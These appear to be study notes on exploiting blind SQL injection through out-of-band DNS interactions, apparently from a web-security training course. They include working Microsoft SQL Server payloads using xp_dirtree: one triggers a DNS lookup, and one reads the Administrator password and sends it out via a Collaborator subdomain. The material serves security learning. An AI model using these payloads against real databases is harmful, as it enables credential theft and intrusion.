## Exploiting blind SQL injection using out-of-band (OAST) techniques:
- The application continues processing the user's request in the original thread, and uses another thread to execute a SQL query using the tracking cookie.
- Typically the most effective is DNS (domain name service) for this type of SQLi.
- The easiest and most reliable tool for using out-of-band techniques is Burp Collaborator.

- The techniques for triggering a DNS query are specific to the type of database being used. For example,
- the following input on Microsoft SQL Server can be used to cause a DNS lookup on a specified domain:
- Injection: `'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'-- `
- This causes the database to perform a lookup for the following domain: `0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net`

## Having confirmed a way to trigger out-of-band interactions, you can then use the out-of-band channel to exfiltrate data from the vulnerable application
- Injection: `'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--`
- This input reads the password for the Administrator user, appends a unique Collaborator subdomain, and triggers a DNS lookup. This lookup allows you to view the captured password: S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net

> Out-of-band (OAST) techniques are a powerful way to detect and exploit blind SQL injection, due to the high chance of success and the ability to directly exfiltrate data within the out-of-band channel.


